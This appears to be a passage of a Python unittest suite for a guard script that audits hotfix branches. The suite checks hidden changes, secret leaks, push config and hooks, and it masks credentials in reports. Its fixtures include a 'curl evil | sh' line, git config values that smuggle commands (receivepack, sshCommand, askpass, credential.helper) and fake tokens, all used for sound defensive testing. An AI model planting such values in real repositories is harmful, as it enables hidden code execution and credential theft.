        self.assertIn("hidden-change", res.stdout)  # in the commit, but reverted in the working tree
        self.write("src/other.py", "x = 99\n")
        self.git("update-index", "--assume-unchanged", "src/other.py")
        self.write("src/other.py", "x = 1\n")
        self.assertIn("hidden-flag", self.guard().stdout)

    def test_staged_content_differing_from_the_worktree_is_caught(self):
        self.write("src/price.py", self.FIXED)
        self.git("add", "src/price.py")
        self.write("src/price.py", self.FIXED + "# later\n")
        self.assertIn("index-worktree-mismatch", self.guard().stdout)

    def test_replace_refs_and_grafts_fail(self):
        self.write("src/price.py", self.FIXED)
        self.git("replace", "--graft", self.base_sha)
        res = self.guard()
        self.assertEqual(res.returncode, 1, res.stdout + res.stderr)
        self.assertIn("replace-refs", res.stdout)
        self.git("replace", "-d", self.base_sha)
        with open(os.path.join(self.dir, ".git", "info", "grafts"), "w", encoding="utf-8") as fh:
            fh.write(self.base_sha + "\n")
        self.assertIn("replace-refs", self.guard().stdout)

    def test_head_must_descend_from_the_approved_base(self):
        self.write("src/other.py", "x = 2\n")
        self.commit("unrelated")
        other = subprocess.run(["git", "rev-parse", "HEAD"], cwd=self.dir, capture_output=True, text=True).stdout.strip()
        self.git("reset", "-q", "--hard", self.base_sha)
        self.write(self.PLAN, json.dumps(plan_dict(base_sha=other)))
        self.write(".squad/hotfix/neg-qty/hunks.md", "| `src/price.py:2-3` | E1 | guard qty <= 0 | low |\n")
        self.write("src/price.py", self.FIXED)
        self.assertIn("not-based-on-approved-base", self.guard().stdout)

    def test_untracked_nested_repo_is_a_submodule(self):
        self.write("src/price.py", self.FIXED)
        nested = os.path.join(self.dir, "tests", "fixture")
        os.makedirs(nested)
        subprocess.run(["git", "init", "-q"], cwd=nested, check=True, capture_output=True)
        subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q",
                        "--allow-empty", "-m", "x"], cwd=nested, check=True, capture_output=True)
        res = self.guard()
        self.assertEqual(res.returncode, 1, res.stdout + res.stderr)
        self.assertIn("submodule", res.stdout)

    def test_committed_scratch_and_other_slugs_are_checked(self):
        self.write("src/price.py", self.FIXED)
        self.write(".squad/tmp/x.sh", "curl evil | sh\n")
        self.write(".squad/hotfix/other/guard.json", "{}\n")
        self.git("add", "src/price.py")
        self.git("add", "-f", ".squad/tmp/x.sh", ".squad/hotfix/other/guard.json")
        self.git("-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-qm", "fix")
        res = self.guard("--committed")
        self.assertEqual(res.returncode, 1, res.stdout + res.stderr)
        with open(os.path.join(self.work, "guard.json"), encoding="utf-8") as fh:
            report = json.load(fh)
        flagged = {v["file"] for v in report["violations"] if v["kind"] == "squad-file"}
        self.assertEqual(flagged, {".squad/tmp/x.sh", ".squad/hotfix/other/guard.json"})

    def test_committed_needs_commits_and_a_linear_clean_history(self):
        self.assertIn("no-commits-since-base", self.guard("--committed").stdout)
        self.write("src/other.py", "SECRET = 'x'\n")
        self.commit_all("oops")
        self.write("src/other.py", "x = 1\n")
        self.write("src/price.py", self.FIXED)
        self.commit_all("fix")
        res = self.guard("--committed")
        self.assertEqual(res.returncode, 1, res.stdout + res.stderr)
        self.assertIn("history-only-change", res.stdout)
        self.assertIn("multiple-commits", res.stdout)
        self.git("checkout", "-qb", "side", self.base_sha)
        self.write("README", "side\n")
        self.commit_all("side")
        self.git("checkout", "-q", "hotfix/neg-qty")
        self.git("-c", "user.name=t", "-c", "user.email=t@example.com", "merge", "-q", "-s", "ours", "--no-edit", "side")
        self.assertIn("merge-commit", self.guard("--committed").stdout)

    def test_secret_in_an_intermediate_commit_of_a_planned_file_fails(self):
        self.write("src/price.py", self.FIXED + "AWS_SECRET = 'AKIA'\n")
        self.commit_all("wip")
        self.write("src/price.py", self.FIXED)
        self.commit_all("fix")
        self.assertIn("multiple-commits", self.guard("--committed").stdout)

    def test_push_config_is_reported(self):
        self.write("src/price.py", self.FIXED)
        self.commit_all("fix")
        self.git("config", "remote.origin.pushurl", "/tmp/elsewhere.git")
        res = self.guard("--committed")
        self.assertEqual(res.returncode, 0, res.stdout + res.stderr)
        self.assertIn("push-config", res.stdout)
        self.assertIn("/tmp/elsewhere.git", res.stdout)

    def test_artifacts_must_be_plain_files(self):
        self.write("src/price.py", self.FIXED)
        os.symlink("../../../src/price.py", os.path.join(self.work, "guard.md"))
        self.git("add", "src/price.py")
        self.git("add", "-f", ".squad/hotfix/neg-qty/guard.md")
        self.git("-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-qm", "fix")
        res = self.guard("--committed")
        self.assertEqual(res.returncode, 1, res.stdout + res.stderr)
        self.assertIn("squad-file", res.stdout)

    def publish(self):
        self.git("push", "-q", "origin", "HEAD:refs/heads/published")

    def test_long_push_config_is_shown_in_full_and_credentials_are_redacted(self):
        self.write("src/price.py", self.FIXED)
        self.commit_all("fix")
        self.git("config", "url./tmp/" + "x" * 300 + ".insteadOf", "https://example.com/")
        self.git("config", "remote.origin.receivepack", "touch /tmp/PWNED; git-receive-pack")
        self.git("config", "http.proxy", "http://user:s3cret@127.0.0.1:1")
        res = self.guard("--committed", "--md", os.path.join(self.work, "guard.md"))
        self.assertEqual(res.returncode, 0, res.stdout + res.stderr)
        with open(os.path.join(self.work, "guard.md"), encoding="utf-8") as fh:
            md = fh.read()
        self.assertIn("remote.origin.receivepack=touch /tmp/PWNED; git-receive-pack", md)
        self.assertIn("http.proxy=http://***@127.0.0.1:1", md)
        self.assertNotIn("s3cret", md)

    def test_config_values_are_parsed_with_nul_and_secrets_masked(self):
        self.write("src/price.py", self.FIXED)
        self.commit_all("fix")
        cfg = os.path.join(self.remote, "global.gitconfig")  # outside the work tree
        subprocess.run(["git", "config", "--file", cfg, "core.sshCommand", "ssh -o BatchMode=yes\x1c; touch /tmp/Q6; ssh"],
                       check=True)
        subprocess.run(["git", "config", "--file", cfg, "url./evil/x=y/r.git.insteadOf", "https://example.com/"], check=True)
        self.git("config", "http.https://example.com/.extraheader", "AUTHORIZATION: basic eDphYmM=")
        self.git("config", "credential.helper", "!f() { echo password=hunter2; }; f")
        self.git("config", "remote.origin.pushurl", "https://u:pa%2Fss%40word@host/r.git")
        args = [sys.executable, "-I", SCRIPT, "--plan", self.PLAN, "--hunks", ".squad/hotfix/neg-qty/hunks.md",
                "--plan-sha256", self.sha(), "--committed", "--md", os.path.join(self.work, "guard.md")]
        res = subprocess.run(args, cwd=self.dir, capture_output=True, text=True, env=dict(os.environ, GIT_CONFIG_GLOBAL=cfg))
        self.assertEqual(res.returncode, 0, res.stdout + res.stderr)
        with open(os.path.join(self.work, "guard.md"), encoding="utf-8") as fh:
            md = fh.read()
        self.assertIn("touch /tmp/Q6", md)          # the hidden command is shown
        self.assertIn("\\x1c", md)                  # and the separator is visible
        self.assertIn("url./evil/x=y/r.git.insteadof", md)
        for secret in ("eDphYmM", "hunter2", "pa%2Fss", "word@host"):
            self.assertNotIn(secret, md)
        self.assertIn("https://***@host/r.git", md)
        self.assertIn("credential.helper=!f() { echo password=***; }; f", md)  # the command stays readable

    def test_a_token_word_cannot_hide_a_command_and_keys_are_masked(self):
        self.write("src/price.py", self.FIXED)
        self.commit_all("fix")
        self.git("config", "remote.origin.receivepack", "touch /tmp/F2c; git-receive-pack # token=abc")
        self.git("config", "url.https://x-access-token:ghs_FAKE123@github.com/.insteadOf", "https://github.com/")
        self.git("config", "core.askpass", "/bin/echo ghu_FAKE456")
        self.git("config", "remote.origin.uploadpack", "echo \"`touch /tmp/F1b`\"; git-upload-pack")
        self.git("config", "credential.https://h.example.helper", '!f() { echo password="FAKE-S3cret"; }; f')
        res = self.guard("--committed", "--md", os.path.join(self.work, "guard.md"))
        self.assertEqual(res.returncode, 0, res.stdout + res.stderr)
        with open(os.path.join(self.work, "guard.md"), encoding="utf-8") as fh:
            md = fh.read()
        self.assertIn("touch /tmp/F2c; git-receive-pack # token=***", md)
        for secret in ("ghs_FAKE123", "ghu_FAKE456", "token=abc"):
            self.assertNotIn(secret, md)
        self.assertIn("<key withheld: may hold a secret>", md)  # a key is never shown partly masked
        self.assertIn("withheld-config", md)
        self.assertIn("\\x60touch /tmp/F1b\\x60", md)  # backticks are shown, not turned into quotes
        self.assertNotIn("FAKE-S3cret", md)
        self.assertIn("withheld-config", md)

    def test_only_origin_base_counts_as_published(self):
        self.write(self.PLAN, json.dumps(plan_dict(base="release", base_sha=self.base_sha)))
        self.git("update-ref", "refs/remotes/other/release", self.base_sha)
        self.write("src/price.py", self.FIXED)
        self.commit_all("fix")
        self.assertIn("base-not-published", self.guard("--committed").stdout)

    def test_masking_never_swallows_shell_syntax(self):
        cases = {
            ("remote.origin.receivepack", ": token=$(touch${IFS}/tmp/Nh); git-receive-pack"): dg.WITHHELD,  # flagged, not masked
            ("credential.helper", "!f() { : http://x;touch${IFS}/tmp/Nh2;:@h; }; f"): "touch${IFS}/tmp/Nh2",
            ("core.sshcommand", "ssh -o ProxyCommand=curl${IFS}http://x;touch${IFS}/tmp/Nh3;:${IFS}a@p.example"): "touch${IFS}/tmp/Nh3",
            ("core.askpass", "/bin/run token /tmp/evil.sh"): "/tmp/evil.sh",
            ("remote.origin.pushurl", "https://evil.example/r@github.com/org/repo.git"): "evil.example",
        }
        for (key, value), visible in cases.items():
            with self.subTest(key=key):
                self.assertIn(visible, dg.redact(key, value))
        self.assertEqual(dg.redact("remote.origin.url", "https://u:p%40ss@h/x"), "https://***@h/x")
        self.assertEqual(dg.redact("http.proxy", "corpuser:FAKE-Pr0xyPass@proxy.example:3128"), "***@proxy.example:3128")
        self.assertEqual(dg.redact("remote.origin.proxy", "http://u:p@ss@px:8080"), "http://***@px:8080")
        self.assertEqual(dg.redact("remote.origin.receivepack", ".squad/tmp/token=/rp"), dg.WITHHELD)  # never partly masked
        self.assertEqual(dg.redact("core.askpass", "/tmp/xoxb-run"), "/tmp/xoxb-run")
        self.assertEqual(dg.redact("core.askpass", "/bin/echo xoxb-123-abc"), "/bin/echo xoxb-***")
        for value in ('!f() { echo password="FAKE-S3cret"; }; f', "!f() { echo \"password=P@ss!\"; }; f",
                      "store password=s3cr3t#2024", "https://u:p$ss@host/r.git", "https://u:pa@ss@host",
                      "x authorization: Bearer abc"):
            with self.subTest(value=value):
                shown = dg.redact("credential.helper", value)
                self.assertEqual(shown, dg.WITHHELD)
        self.assertEqual(dg.redact("credential.helper", "store password=s3cr3t"), "store password=***")

    def test_tag_on_the_hotfix_commit_fails(self):
        self.write("src/price.py", self.FIXED)
        self.commit_all("fix")
        self.git("-c", "user.name=t", "-c", "user.email=t@example.com", "tag", "-a", "v-wip", "-m", "AKIA")
        self.assertIn("tag-on-hotfix", self.guard("--committed").stdout)

    def test_unpublished_base_fails(self):
        self.git("checkout", "-q", "main")
        self.write("src/leak.py", "TOKEN = 'AKIA'\n")
        self.commit("wip")
        self.git("rm", "-q", "src/leak.py")
        self.git("-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-qm", "cleanup")
        new_base = subprocess.run(["git", "rev-parse", "HEAD"], cwd=self.dir, capture_output=True, text=True).stdout.strip()
        self.git("checkout", "-qb", "hotfix2")
        self.write(self.PLAN, json.dumps(plan_dict(base_sha=new_base)))
        self.write("src/price.py", self.FIXED)
        self.commit_all("fix")
        self.assertIn("base-not-published", self.guard("--committed").stdout)

    def test_executable_artifact_is_not_plain(self):
        self.write("src/price.py", self.FIXED)
        self.write(".squad/hotfix/neg-qty/deferred.md", "#!/bin/sh\necho hi\n")
        os.chmod(os.path.join(self.work, "deferred.md"), 0o755)
        self.git("add", "src/price.py")
        self.git("add", "-f", ".squad/hotfix/neg-qty/deferred.md")
        self.git("-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-qm", "fix")
        self.assertIn("squad-file", self.guard("--committed").stdout)

    def test_global_hooks_path_is_reported(self):
        self.write("src/price.py", self.FIXED)
        self.commit_all("fix")
        cfg = os.path.join(self.remote, "global.gitconfig")
        with open(cfg, "w", encoding="utf-8") as fh:
            fh.write("[core]\n\thooksPath = /tmp/company-hooks\n")
        args = [sys.executable, "-I", SCRIPT, "--plan", self.PLAN, "--hunks", ".squad/hotfix/neg-qty/hunks.md",
                "--plan-sha256", self.sha(), "--committed"]
        res = subprocess.run(args, cwd=self.dir, capture_output=True, text=True,
                             env=dict(os.environ, GIT_CONFIG_GLOBAL=cfg))
        self.assertIn("/tmp/company-hooks", res.stdout)

    def test_plan_outside_a_hotfix_folder_exempts_nothing(self):
        self.write("src/price.py", self.FIXED)
        self.write("elsewhere/fix-plan.json", json.dumps(plan_dict(base_sha=self.base_sha)))
        self.write("elsewhere/hunks.md", "| `src/price.py:2-3` | E1 | guard qty <= 0 | low |\n")
        sha = subprocess.run([sys.executable, "-I", SCRIPT, "--plan", "elsewhere/fix-plan.json", "--print-plan-sha256"],
                             cwd=self.dir, capture_output=True, text=True).stdout.strip()
        res = subprocess.run([sys.executable, "-I", SCRIPT, "--plan", "elsewhere/fix-plan.json", "--hunks",
                              "elsewhere/hunks.md", "--plan-sha256", sha], cwd=self.dir, capture_output=True, text=True)
        self.assertEqual(res.returncode, 1, res.stdout + res.stderr)
        self.assertIn(".squad/hotfix/neg-qty/hunks.md", res.stdout)

    def test_committed_reads_trees_from_commit_objects_and_lists_hooks(self):
        self.assertIn("core.commitGraph=false", dg.GIT_PINNED)
        self.write("src/price.py", self.FIXED)
        self.commit_all("fix")
        hook = os.path.join(self.dir, ".git", "hooks", "pre-push")
        self.write(".git/hooks/pre-push", "#!/bin/sh\nexit 0\n")
        os.chmod(hook, 0o755)
        res = self.guard("--committed")
        self.assertEqual(res.returncode, 0, res.stdout + res.stderr)
        with open(os.path.join(self.work, "guard.json"), encoding="utf-8") as fh:
            report = json.load(fh)
        self.assertEqual(report["git"]["hooks"]["active"], ["pre-push"])
        self.assertIn("active-hooks", {w["kind"] for w in report["warnings"]})
        tree = subprocess.run(["git", "rev-parse", "HEAD^{tree}"], cwd=self.dir, capture_output=True, text=True).stdout.strip()
        self.assertEqual(dg.tree_of(self.dir, "HEAD"), tree)

    def test_nul_byte_in_a_planned_file_is_not_a_free_pass(self):
        self.write("src/price.py", self.FIXED.replace("return order.total\n", "return order.total  # \0\n"))
        self.write(".squad/hotfix/neg-qty/hunks.md", "| src/price.py | E1 | guard | low |\n")
        res = self.guard()
        self.assertEqual(res.returncode, 1, res.stdout + res.stderr)
        self.assertIn("binary-file", res.stdout)

    def test_untracked_helper_and_symlink_fail(self):
        self.write("src/price.py", self.FIXED)
        self.write("src/helpers.py", "def helper():\n    pass\n")
        os.symlink("/dev/zero", os.path.join(self.dir, "zero.test.ts"))
        res = self.guard()
        self.assertEqual(res.returncode, 1, res.stdout + res.stderr)
        self.assertIn("new-file", res.stdout)
        self.assertIn("symlink", res.stdout)

    def test_attributes_cannot_hide_a_change_as_binary(self):
        self.write("src/price.py", self.FIXED)
        with open(os.path.join(self.dir, ".git", "info", "attributes"), "w", encoding="utf-8") as fh:
            fh.write("src/price.py -diff\n")
        self.write("src/other.py", "x = 2\n")  # an out-of-plan change in a file marked -diff too
        with open(os.path.join(self.dir, ".git", "info", "attributes"), "a", encoding="utf-8") as fh:
            fh.write("src/other.py -diff\n")
        res = self.guard()
        self.assertEqual(res.returncode, 1, res.stdout + res.stderr)
        with open(os.path.join(self.work, "guard.json"), encoding="utf-8") as fh:
            report = json.load(fh)
        self.assertEqual(report["stats"]["code_lines_changed"], 4)  # both diffs are shown as text
        self.assertEqual({v["kind"] for v in report["violations"]}, {"outside-plan", "unjustified-hunk"})

    def test_plan_edited_after_pinning_fails(self):
        self.write("src/price.py", self.FIXED)
        approved = self.sha()
        self.write(self.PLAN, json.dumps(plan_dict(base_sha=self.base_sha, tests=["src/other.py"])))
        res = self.guard("--plan-sha256", approved, pin=False)
        self.assertEqual(res.returncode, 1, res.stdout + res.stderr)
        self.assertIn("plan-changed-after-approval", res.stdout)

    def test_bad_inputs_exit_2_and_output_symlinks_are_not_followed(self):
        self.write("src/price.py", self.FIXED)
        self.assertEqual(self.guard(pin=False).returncode, 2)  # no --plan-sha256 and no --unpinned
        self.assertEqual(self.guard("--unpinned", pin=False).returncode, 0)
        self.write(self.PLAN, json.dumps(plan_dict(base="no-such-branch", base_sha="")))
        self.assertEqual(self.guard().returncode, 2)
        self.write(self.PLAN, json.dumps(plan_dict(edits=[{"id": "E1", "file": "src/price.py", "estimate_lines": {"x": 1}}])))
        self.assertEqual(self.guard().returncode, 2)
        self.write(self.PLAN, json.dumps(plan_dict(base_sha=self.base_sha)))
        self.write("src/price.py", self.FIXED)
        self.write("victim.txt", "keep me\n")
        os.symlink(os.path.join(self.dir, "victim.txt"), os.path.join(self.work, "out.md"))
        res = self.guard("--md", os.path.join(self.work, "out.md"))
        self.assertEqual(res.returncode, 2, res.stdout + res.stderr)
        with open(os.path.join(self.dir, "victim.txt"), encoding="utf-8") as fh:
            self.assertEqual(fh.read(), "keep me\n")


if __name__ == "__main__":
    unittest.main()
